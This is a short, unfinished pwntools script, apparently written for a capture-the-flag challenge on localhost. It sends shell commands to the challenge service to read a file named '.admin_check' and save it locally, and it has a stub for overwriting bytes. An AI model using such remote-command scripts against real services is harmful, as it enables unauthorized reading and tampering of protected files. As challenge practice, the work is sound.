from pwn import *

### set  for  challenge ###
context(arch = 'amd64', os = 'linux')
addr = "localhost"
port = 2007
### set  for  challenge ###

###other setup
context.terminal = ['tmux', 'splitw', '-h']
p = remote(addr,port)


## PWN:
CHAR = "%"

def command(c):
    p.recvuntil(CHAR)
    p.sendlineafter(CHAR, c)

def grab_file():
    tag=b"_END"
    command("echo -n \"$(<.admin_check)_END\"")
    byt = p.recvuntil(tag, drop=True)[1:]
#    byt = byt.replace(b" ",b"\x00")
    with open("test", "wb") as f:
        f.write(byt)
    byt2 =  p.recv(400)
    print(byt2)

def overwrite_bytes(s):
    p.recvuntil(CHAR)



if __name__ == "__main__":
    #setup directory
    command("cd bin")  
    #grab bin data
    grab_file()
    #p.interactive()

